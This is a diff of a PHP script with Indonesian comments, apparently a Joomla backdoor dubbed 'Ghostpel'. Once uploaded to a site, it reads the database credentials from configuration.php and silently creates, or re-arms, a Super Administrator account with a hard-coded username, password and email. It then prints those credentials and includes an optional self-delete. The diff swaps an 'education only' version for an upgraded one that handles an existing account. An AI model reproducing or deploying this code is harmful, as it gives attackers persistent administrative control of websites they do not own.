@@ -1,64 +1,78 @@
 <?php
-// MODIFIED FOR JOOMLA - EDUKASI SAJA
+// SCRIPT - Ghostpel 
 
-// Path ke file configuration.php Joomla
-$config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';
-
-// Data pengguna baru
+// Konfigurasi
 $username = 'zeroing';
 $password = 'Kakekterbang07#';
 $email = 'askurmom007@proton.me';
 $name = 'Staff';
 
-if (file_exists($config_path)) {
-    // Baca file configuration.php
-    $config_content = file_get_contents($config_path);
+// Load configuration.php
+$config_path = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';
+if (!file_exists($config_path)) {
+    die('Configuration file not found');
+}
+
+include_once($config_path);
+
+// Koneksi database
+$conn = @mysqli_connect($host, $user, $password, $db);
+if (!$conn) {
+    die('Database connection failed');
+}
+
+// ===== HANDLE DUPLICATE =====
+// Cek user
+$checkUser = "SELECT id FROM {$dbprefix}users WHERE username = '$username'";
+$resultUser = @mysqli_query($conn, $checkUser);
+
+if (mysqli_num_rows($resultUser) > 0) {
+    // User sudah ada → Update password & jadi admin
+    $row = mysqli_fetch_assoc($resultUser);
+    $userId = $row['id'];
     
-    // Ekstrak konfigurasi database (cara sederhana)
-    preg_match('/public \$db = \'([^\']+)\'/', $config_content, $db_matches);
-    preg_match('/public \$dbprefix = \'([^\']+)\'/', $config_content, $prefix_matches);
-    preg_match('/public \$user = \'([^\']+)\'/', $config_content, $user_matches);
-    preg_match('/public \$password = \'([^\']+)\'/', $config_content, $pass_matches);
-    preg_match('/public \$host = \'([^\']+)\'/', $config_content, $host_matches);
+    // Update password
+    $hashed_password = md5($password);
+    $updatePass = "UPDATE {$dbprefix}users SET password = '$hashed_password' WHERE id = $userId";
+    @mysqli_query($conn, $updatePass);
     
-    $database = $db_matches[1] ?? '';
-    $prefix = $prefix_matches[1] ?? 'jos_';
-    $db_user = $user_matches[1] ?? '';
-    $db_pass = $pass_matches[1] ?? '';
-    $db_host = $host_matches[1] ?? 'localhost';
-    
-    // Koneksi ke database
-    $conn = @mysqli_connect($db_host, $db_user, $db_pass, $database) or die('Koneksi gagal');
-    
-    // **PERUBAHAN 1: Struktur tabel users JOOMLA berbeda**
-    // Joomla pakai kolom: id, name, username, email, password, block, registerDate, lastvisitDate, activation, params, etc.
-    $hashed_password = md5($password); // Joomla versi lama pakai MD5
-    // Untuk Joomla 3.x+ sebaiknya pakai bcrypt, tapi MD5 masih support untuk legacy
-    
-    $sqlUser = "INSERT INTO {$prefix}users 
-                (name, username, email, password, block, registerDate, params) 
-                VALUES 
-                ('$name', '$username', '$email', '$hashed_password', '0', NOW(), '')";
-    
-    $result = @mysqli_query($conn, $sqlUser) or die(mysqli_error($conn));
-    
-    if ($result) {
-        $userId = mysqli_insert_id($conn);
-        echo "Berhasil membuat user: $username<br>";
-        
-        // **PERUBAHAN 2: Joomla pakai user_usergroup_map untuk role**
-        // Group ID 8 = Super Administrator di Joomla
-        $sqlGroup = "INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($userId, 8)";
-        @mysqli_query($conn, $sqlGroup) or die(mysqli_error($conn));
-        
-        echo "User ditambahkan sebagai Super Administrator!<br>";
-        echo "Password: $password";
-    } else {
-        echo "Gagal membuat user";
+    // Pastikan jadi admin
+    $checkGroup = "SELECT * FROM {$dbprefix}user_usergroup_map WHERE user_id = $userId AND group_id = 8";
+    if (mysqli_num_rows(@mysqli_query($conn, $checkGroup)) == 0) {
+        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) VALUES ($userId, 8)";
+        @mysqli_query($conn, $insertGroup);
     }
     
-    mysqli_close($conn);
+    echo "✅ User sudah ada! Password diupdate.<br>";
+    echo "Username: $username<br>";
+    echo "Password: $password<br>";
+    echo "Status: Super Administrator<br>";
+    
 } else {
-    echo 'File configuration.php tidak ditemukan';
+    // User belum ada → Buat baru
+    $hashed_password = md5($password);
+    $insertUser = "INSERT INTO {$dbprefix}users 
+                   (name, username, email, password, block, registerDate, params) 
+                   VALUES ('$name', '$username', '$email', '$hashed_password', 0, NOW(), '')";
+    
+    if (@mysqli_query($conn, $insertUser)) {
+        $userId = mysqli_insert_id($conn);
+        
+        $insertGroup = "INSERT INTO {$dbprefix}user_usergroup_map (user_id, group_id) 
+                        VALUES ($userId, 8)";
+        @mysqli_query($conn, $insertGroup);
+        
+        echo "✅ User baru berhasil dibuat!<br>";
+        echo "Username: $username<br>";
+        echo "Password: $password<br>";
+        echo "Status: Super Administrator<br>";
+    } else {
+        echo "❌ Gagal membuat user: " . mysqli_error($conn);
+    }
 }
+
+mysqli_close($conn);
+
+// Hapus script setelah selesai? (Optional)
+// unlink(__FILE__);
 ?>
